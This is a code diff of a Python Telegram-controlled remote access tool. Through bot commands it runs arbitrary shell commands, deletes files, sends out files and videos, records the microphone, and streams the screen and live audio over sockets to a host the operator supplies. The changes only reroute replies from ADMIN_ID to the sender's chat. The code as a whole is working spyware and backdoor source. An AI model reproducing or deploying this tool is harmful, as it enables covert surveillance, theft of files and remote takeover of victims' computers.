@@ -53,31 +53,30 @@ class Client:
     def create_markup(self):
         markup = ReplyKeyboardMarkup()
         list_files = os.listdir(os.getcwd())
-        for i in list_files:
-            markup.add(i)
 
+        [markup.add(i) for i in list_files]
         markup.add("EXIT")
         return markup
 
     def check_command(self, ms):
         if ms.text == "cd":
-            bot.send_message(ADMIN_ID, os.getcwd(), reply_markup=markup)
+            bot.send_message(ms.chat.id, os.getcwd(), reply_markup=markup)
 
         elif ms.text == "chdir":
             markup_chdir = self.create_markup()
             markup_chdir.add("..")
-            bot.send_message(ADMIN_ID, "Enter path...", reply_markup=markup_chdir)
+            bot.send_message(ms.chat.id, "Enter path...", reply_markup=markup_chdir)
             
             @bot.message_handler(content_types=["text"])
             def chdir_next(ms):
                 if ms.text != "EXIT":
                     try:
                         os.chdir(ms.text)
-                        bot.send_message(ADMIN_ID, os.getcwd(), reply_markup=markup)
+                        bot.send_message(ms.chat.id, os.getcwd(), reply_markup=markup)
                     except Exception as e:
-                        bot.send_message(ADMIN_ID, f"Error:\n{e}", reply_markup=markup)
+                        bot.send_message(ms.chat.id, f"Error:\n{e}", reply_markup=markup)
                 else:
-                    bot.send_message(ADMIN_ID, "EXIT", reply_markup=markup)
+                    bot.send_message(ms.chat.id, "EXIT", reply_markup=markup)
 
             bot.register_next_step_handler(ms, chdir_next)
 
@@ -85,33 +84,33 @@ class Client:
             try:
                 output = "\n".join(os.listdir())
                 if output:
-                    bot.send_message(ADMIN_ID, output, reply_markup=markup)
+                    bot.send_message(ms.chat.id, output, reply_markup=markup)
                 else:
-                    bot.send_message(ADMIN_ID, "<Empty>", reply_markup=markup)
+                    bot.send_message(ms.chat.id, "<Empty>", reply_markup=markup)
             except Exception as e:
-                bot.send_message(ADMIN_ID, f"Error:\n{e}")
+                bot.send_message(ms.chat.id, f"Error:\n{e}")
 
         elif ms.text == "rm_file":
             markup_rm = self.create_markup()
-            bot.send_message(ADMIN_ID, "Enter path...", reply_markup=markup_rm)
+            bot.send_message(ms.chat.id, "Enter path...", reply_markup=markup_rm)
 
             @bot.message_handler(content_types=["text"])
             def rm_file_next(ms):
                 if ms.text != "EXIT":
                     try:
                         os.remove(ms.text)
-                        bot.send_message(ADMIN_ID, "File removed ✅", reply_markup=markup)
+                        bot.send_message(ms.chat.id, "File removed ✅", reply_markup=markup)
                     except Exception as e:
-                        bot.send_message(ADMIN_ID, f"Error:\n{e}", reply_markup=markup)
+                        bot.send_message(ms.chat.id, f"Error:\n{e}", reply_markup=markup)
                 else:
-                    bot.send_message(ADMIN_ID, "EXIT", reply_markup=markup)
+                    bot.send_message(ms.chat.id, "EXIT", reply_markup=markup)
 
             bot.register_next_step_handler(ms, rm_file_next)
 
         elif ms.text == "exec_cmd":
             markup_exec_cmd = ReplyKeyboardMarkup()
             markup_exec_cmd.add("EXIT")
-            bot.send_message(ADMIN_ID, "Enter command...")
+            bot.send_message(ms.chat.id, "Enter command...")
 
             @bot.message_handler(content_types=["text"])
             def exec_cmd_next(ms):
@@ -120,29 +119,29 @@ class Client:
                         output = subprocess.run(ms.text, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                         output = output.stdout + output.stderr
                         if output:
-                            bot.send_message(ADMIN_ID, output, reply_markup=markup)
+                            bot.send_message(ms.chat.id, output, reply_markup=markup)
                         else:
-                            bot.send_message(ADMIN_ID, "<Empty>", reply_markup=markup)
+                            bot.send_message(ms.chat.id, "<Empty>", reply_markup=markup)
                     except Exception as e:
-                        bot.send_message(ADMIN_ID, f"Error:\n{e}")
+                        bot.send_message(ms.chat.id, f"Error:\n{e}")
                 else:
-                    bot.send_message(ADMIN_ID, "EXIT", reply_markup=markup)
+                    bot.send_message(ms.chat.id, "EXIT", reply_markup=markup)
 
             bot.register_next_step_handler(ms, exec_cmd_next)
 
         elif ms.text == "get_file":
             markup_get_file = self.create_markup()
-            bot.send_message(ADMIN_ID, "Enter path...", reply_markup=markup_get_file)
+            bot.send_message(ms.chat.id, "Enter path...", reply_markup=markup_get_file)
             
             @bot.message_handler(content_types=["text"])
             def get_file_next(ms):
                 if ms.text != "EXIT":
                     try:
-                        bot.send_document(ADMIN_ID, open(ms.text, "rb"), reply_markup=markup)
+                        bot.send_document(ms.chat.id, open(ms.text, "rb"), reply_markup=markup)
                     except Exception as e:
-                        bot.send_message(ADMIN_ID, f"Error:\n{e}")
+                        bot.send_message(ms.chat.id, f"Error:\n{e}")
                 else:
-                    bot.send_message(ADMIN_ID, "EXIT", reply_markup=markup)
+                    bot.send_message(ms.chat.id, "EXIT", reply_markup=markup)
 
             bot.register_next_step_handler(ms, get_file_next)
 
@@ -150,7 +149,7 @@ class Client:
         elif ms.text == "record_audio":
             markup_record_audio = ReplyKeyboardMarkup()
             markup_record_audio.add("EXIT")
-            bot.send_message(ADMIN_ID, "Enter time, quantity iteration...", reply_markup=markup_record_audio)
+            bot.send_message(ms.chat.id, "Enter time, quantity iteration...", reply_markup=markup_record_audio)
 
             @bot.message_handler(content_types=["text"])
             def record_audio_next(ms):
@@ -160,19 +159,19 @@ class Client:
                         time = int(list_data[0])
                         quantity = int(list_data[1])
 
-                        bot.send_message(ADMIN_ID, "Recording 🎲")
+                        bot.send_message(ms.chat.id, "Recording 🎲")
 
                         for i in range(quantity):
                             self.recordAUDIO(time)
                             with open(self.filename_audio, 'rb') as audio:
-                                bot.send_audio(ADMIN_ID, audio)
+                                bot.send_audio(ms.chat.id, audio)
 
                         os.remove(self.filename_audio)
-                        bot.send_message(ADMIN_ID, "Finished recording ✅", reply_markup=markup)
+                        bot.send_message(ms.chat.id, "Finished recording ✅", reply_markup=markup)
                     except Exception as e:
-                        bot.send_message(ADMIN_ID, f"Error:\n{e}")
+                        bot.send_message(ms.chat.id, f"Error:\n{e}")
                 else:
-                    bot.send_message(ADMIN_ID, "EXIT", reply_markup=markup)
+                    bot.send_message(ms.chat.id, "EXIT", reply_markup=markup)
 
             bot.register_next_step_handler(ms, record_audio_next)
 
@@ -195,18 +194,18 @@ class Client:
                 wf.setframerate(self.RATE)
                 wf.writeframes(b"".join(frame))
                 wf.close()
-            
-            bot.send_message(ADMIN_ID, "Unpacked ✅", reply_markup=markup)
-            
+
+            bot.send_message(ms.chat.id, "Unpacked ✅", reply_markup=markup)
+
             with open(self.filename_audio, "rb") as audio:
-                bot.send_audio(ADMIN_ID, audio)
-            
+                bot.send_audio(ms.chat.id, audio)
+
             os.remove(self.filename_audio)
             os.remove("dump_record_audio.dat")
 
 
         elif ms.text == "record_video":
-            bot.send_message(ADMIN_ID, "Recording 🎲", reply_markup=markup)
+            bot.send_message(ms.chat.id, "Recording 🎲", reply_markup=markup)
 
             while True:
                 break_time = round(time.time()) + 70
@@ -230,18 +229,18 @@ class Client:
 
         elif ms.text == "get_video":
             markup_video = self.create_markup()
-            bot.send_message(ADMIN_ID, "Enter path...", reply_markup=markup_video)
+            bot.send_message(ms.chat.id, "Enter path...", reply_markup=markup_video)
 
             @bot.message_handler(content_types=["text"])
             def get_video_next(ms):
                 if ms.text != "EXIT":
                     try:
-                        bot.send_video(ADMIN_ID, open(ms.text, "rb"), reply_markup=markup)
+                        bot.send_video(ms.chat.id, open(ms.text, "rb"), reply_markup=markup)
                         os.remove(ms.text)
                     except Exception as e:
-                        bot.send_message(ADMIN_ID, f"Error:\n{e}")
+                        bot.send_message(ms.chat.id, f"Error:\n{e}")
                 else:
-                    bot.send_message(ADMIN_ID, "EXIT", reply_markup=markup)
+                    bot.send_message(ms.chat.id, "EXIT", reply_markup=markup)
 
             bot.register_next_step_handler(ms, get_video_next)
 
@@ -249,7 +248,7 @@ class Client:
         elif ms.text == "get_screen":
             markup_get_screen = ReplyKeyboardMarkup()
             markup_get_screen.add("EXIT")
-            bot.send_message(ADMIN_ID, "Enter port, host...", reply_markup=markup_get_screen)
+            bot.send_message(ms.chat.id, "Enter port, host...", reply_markup=markup_get_screen)
             
             @bot.message_handler(content_types=["text"])
             def getscreen_next(ms):
@@ -260,19 +259,19 @@ class Client:
                         HOST = list_data[1]
                         
                         self.running_micro = True
-                        thr = Thread(target=self.get_micro, args=(HOST,)).start()
+                        thr = Thread(target=self.get_micro, args=(HOST, ms)).start()
 
                         server_socket_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                         __running = True
-                        
+
                         try:
-                            bot.send_message(ADMIN_ID, "Connection attempt 🎲")
+                            bot.send_message(ms.chat.id, "Connection attempt 🎲")
                             server_socket_s.connect((HOST, PORT))
                         except Exception as e:
-                            bot.send_message(ADMIN_ID, f"Error ❌\n{e}", reply_markup=markup)
+                            bot.send_message(ms.chat.id, f"Error ❌\n{e}", reply_markup=markup)
                             return
 
-                        bot.send_message(ADMIN_ID, "Successful connection ✅", reply_markup=markup)
+                        bot.send_message(ms.chat.id, "Successful connection ✅", reply_markup=markup)
                         while __running:
                             screen = pyautogui.screenshot()
                             frame = np.array(screen)
@@ -287,9 +286,9 @@ class Client:
                                 __running = False
 
                     except Exception as e:
-                        bot.send_message(ADMIN_ID, f"Error:\n{e}", reply_markup=markup)
+                        bot.send_message(ms.chat.id, f"Error:\n{e}", reply_markup=markup)
                 else:
-                    bot.send_message(ADMIN_ID, "EXIT", reply_markup=markup)
+                    bot.send_message(ms.chat.id, "EXIT", reply_markup=markup)
 
             bot.register_next_step_handler(ms, getscreen_next)
 
@@ -321,7 +320,7 @@ class Client:
         wf.writeframes(b"".join(frames))
         wf.close()
 
-    def get_micro(self, HOST):
+    def get_micro(self, HOST, ms):
         PORT = 9999
 
         p = pyaudio.PyAudio()
@@ -336,7 +335,7 @@ class Client:
             server_socket_m = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             server_socket_m.connect((HOST, PORT))
         except Exception as e:
-            bot.send_message(ADMIN_ID, f"Error ❌\n{e}", reply_markup=markup)
+            bot.send_message(ms.chat.id, f"Error ❌\n{e}", reply_markup=markup)
             return
 
         while self.running_micro:
@@ -375,7 +374,7 @@ bot.send_message(ADMIN_ID, "ONLINE ✅", reply_markup=markup)
 @bot.message_handler(commands=["_start"])
 def send_welcome(ms):
     if checkID(ms):
-        bot.send_message(ADMIN_ID, text="/_start", reply_markup=markup)
+        bot.send_message(ms.chat.id, text="/_start", reply_markup=markup)
 
 @bot.message_handler(content_types=["text"])
 def CheckCommand(ms):
@@ -383,7 +382,7 @@ def CheckCommand(ms):
         try:
             client.check_command(ms)
         except Exception as e:
-            bot.send_message(ADMIN_ID, e)
+            bot.send_message(ms.chat.id, e)
 
 
 bot.infinity_polling()
